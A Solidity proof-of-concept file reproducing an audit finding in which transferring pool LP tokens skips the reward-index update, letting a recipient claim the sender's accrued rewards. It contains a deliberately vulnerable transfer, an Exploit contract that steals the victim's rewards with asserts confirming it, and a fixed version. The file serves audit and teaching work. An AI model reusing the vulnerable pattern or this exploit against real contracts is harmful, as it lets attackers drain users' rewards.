// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Hyperhyper LiquidityFacet — a PLP transfer skips the reward index
    (Pashov Audit Group, C-02, 30 March 2025, finding 57736).
    SYNTHETIC, cheatcode-free. One transaction, no warp.
    _getPendingRewards is the audited body. Pending rewards are
    balance * (rewardsPerLPQ128 - usrRwdIndexQ128) / Q128.
    The index is written on deposit and on claim. PLP.transfer moves the
    balance and does not write it. The recipient keeps a stale index, so
    the same rewards are read against the new balance.
    Here the holder was owed 100 RWD and the recipient was owed 0.
    After the transfer the holder is owed 0 and the recipient is owed 100.
    The fixed transfer checkpoints both sides first, so the holder is
    still paid 100 RWD and the recipient is paid 0. */

interface ILPToken {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IERC20Metadata {
    function decimals() external view returns (uint8);
}

library RewardMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256) {
        return a * b / denominator;
    }

    function toDecimals(uint256 amount, uint8 fromDec, uint8 toDec) internal pure returns (uint256) {
        if (fromDec == toDec) return amount;
        if (fromDec > toDec) return amount / (10 ** uint256(fromDec - toDec));
        return amount * (10 ** uint256(toDec - fromDec));
    }
}

struct RewardInfo {
    uint256 rewardsPerLPQ128;
}

struct PoolState {
    mapping(address => RewardInfo) rewardsByToken;
    mapping(address => mapping(address => uint256)) usrRwdIndexQ128;
}

struct Ledger {
    PoolState state;
}

struct BaseConfig {
    address plp;
}

struct SetUp {
    BaseConfig base;
}

struct Layout {
    Ledger ledger;
    SetUp setUp;
}

library PoolStorage {
    function layout() internal pure returns (Layout storage l) {
        bytes32 slot = keccak256("hyperhyper.pool.57736");
        assembly {
            l.slot := slot
        }
    }
}

contract RewardToken {
    string public constant name = "Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract PLP {
    string public constant name = "Pool LP";
    string public constant symbol = "PLP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        // @> VULN: PLP balance moves and usrRwdIndexQ128 is not updated for either side
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// Used only by the fixed facet, after both indexes have been checkpointed.
    function move(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract LiquidityFacet {
    using RewardMath for uint256;

    uint256 public constant Q128 = 1 << 128;

    RewardToken public reward;

    constructor(address plp_, RewardToken reward_) {
        PoolStorage.layout().setUp.base.plp = plp_;
        reward = reward_;
    }

    function deposit(address user, uint256 amount) external {
        PLP(PoolStorage.layout().setUp.base.plp).mint(user, amount);
        _updateLpRewardIndex(address(reward), user);
    }

    function accrue(address token, uint256 indexQ128) external {
        PoolStorage.layout().ledger.state.rewardsByToken[token].rewardsPerLPQ128 = indexQ128;
    }

    function position(address token, address user) external view returns (uint256 bal, uint256 userIndex, uint256 globalIndex) {
        bal = ILPToken(PoolStorage.layout().setUp.base.plp).balanceOf(user);
        userIndex = PoolStorage.layout().ledger.state.usrRwdIndexQ128[token][user];
        globalIndex = PoolStorage.layout().ledger.state.rewardsByToken[token].rewardsPerLPQ128;
    }

    function pending(address token, address user) external view returns (uint256) {
        return _getPendingRewards(token, user);
    }

    function claim(address token) external returns (uint256 paid) {
        paid = _getPendingRewards(token, msg.sender);
        _updateLpRewardIndex(token, msg.sender);
        if (paid != 0) {
            RewardToken(token).transfer(msg.sender, paid);
        }
    }

    // Current update points for usrRwdIndexQ128:
    // 1. First deposit (_initRewardIndex)
    // 2. Full exit (_initRewardIndex)
    // 3. Manual claim (_claimRewards)
    function _updateLpRewardIndex(address token, address user) internal {
        PoolStorage.layout().ledger.state.usrRwdIndexQ128[token][user] =
            PoolStorage.layout().ledger.state.rewardsByToken[token].rewardsPerLPQ128;
    }

    function _getPendingRewards(address token, address user) internal view returns (uint256) {
        RewardInfo storage rewards = PoolStorage.layout().ledger.state.rewardsByToken[token];
        ILPToken plp_ = ILPToken(PoolStorage.layout().setUp.base.plp);
        uint256 lpBalance = plp_.balanceOf(user);
        uint8 plpDecimals = IERC20Metadata(PoolStorage.layout().setUp.base.plp).decimals();
        uint8 tokenDecimals = IERC20Metadata(token).decimals();

        uint256 rewardIndexQ128 = PoolStorage.layout().ledger.state.usrRwdIndexQ128[token][user];
        rewardIndexQ128 = rewards.rewardsPerLPQ128 - rewardIndexQ128;

        return lpBalance.mulDiv(rewardIndexQ128, Q128).toDecimals(plpDecimals, tokenDecimals);
    }
}

contract Holder {
    function send(PLP plp, address to, uint256 amount) external {
        plp.transfer(to, amount);
    }

    function claim(LiquidityFacet pool, address token) external returns (uint256) {
        return pool.claim(token);
    }
}

/// Checkpoints both sides before the balance moves. The holder keeps the
/// rewards already accrued. The recipient's index is the current global
/// index, so the transferred PLP earns nothing for the time already passed.
contract LiquidityFacetFixed {
    uint256 public constant Q128 = 1 << 128;

    PLP public plp;
    RewardToken public reward;
    uint256 public globalIndex;
    mapping(address => uint256) public userIndex;
    mapping(address => uint256) public stored;

    constructor(PLP plp_, RewardToken reward_) {
        plp = plp_;
        reward = reward_;
    }

    function deposit(address user, uint256 amount) external {
        plp.mint(user, amount);
        userIndex[user] = globalIndex;
    }

    function accrue(uint256 indexQ128) external {
        globalIndex = indexQ128;
    }

    function _pending(address user) internal view returns (uint256) {
        return plp.balanceOf(user) * (globalIndex - userIndex[user]) / Q128;
    }

    function transferPLP(address from, address to, uint256 amount) external {
        stored[from] += _pending(from);
        userIndex[from] = globalIndex;
        stored[to] += _pending(to);
        userIndex[to] = globalIndex;
        plp.move(from, to, amount);
    }

    function claim(address user) external returns (uint256 paid) {
        paid = stored[user] + _pending(user);
        stored[user] = 0;
        userIndex[user] = globalIndex;
        if (paid != 0) reward.transfer(user, paid);
    }
}

contract Exploit {
    uint256 public constant STAKE = 100 ether;

    RewardToken public reward; // nonce 1
    PLP public plp; // nonce 2
    LiquidityFacet public pool; // nonce 3
    Holder public victim; // nonce 4

    uint256 public fairVictimAmt;
    uint256 public fairAttackerAmt;
    uint256 public victimReward;
    uint256 public attackerReward;
    uint256 public stolen;

    constructor() {
        reward = new RewardToken();
        plp = new PLP();
        pool = new LiquidityFacet(address(plp), reward);
        victim = new Holder();
    }

    function run() external {
        pool.deposit(address(victim), STAKE);
        reward.mint(address(pool), STAKE);
        pool.accrue(address(reward), pool.Q128());

        (uint256 vBal, uint256 vIdx, uint256 gIdx) = pool.position(address(reward), address(victim));
        fairVictimAmt = vBal * (gIdx - vIdx) / pool.Q128();
        (uint256 aBal, uint256 aIdx, uint256 gIdx2) = pool.position(address(reward), address(this));
        fairAttackerAmt = aBal * (gIdx2 - aIdx) / pool.Q128();

        victim.send(plp, address(this), STAKE);

        victimReward = pool.pending(address(reward), address(victim));
        attackerReward = pool.pending(address(reward), address(this));

        stolen = pool.claim(address(reward));
        uint256 victimPaid = victim.claim(pool, address(reward));

        require(fairVictimAmt == STAKE, "fair victim");
        require(fairAttackerAmt == 0, "fair attacker");
        require(victimReward == 0, "victim reward");
        require(attackerReward == STAKE, "attacker reward");
        require(stolen == STAKE, "stolen");
        require(reward.balanceOf(address(this)) == STAKE, "attacker balance");
        require(victimPaid == 0, "victim was paid");
        require(reward.balanceOf(address(victim)) == 0, "victim balance");
    }
}
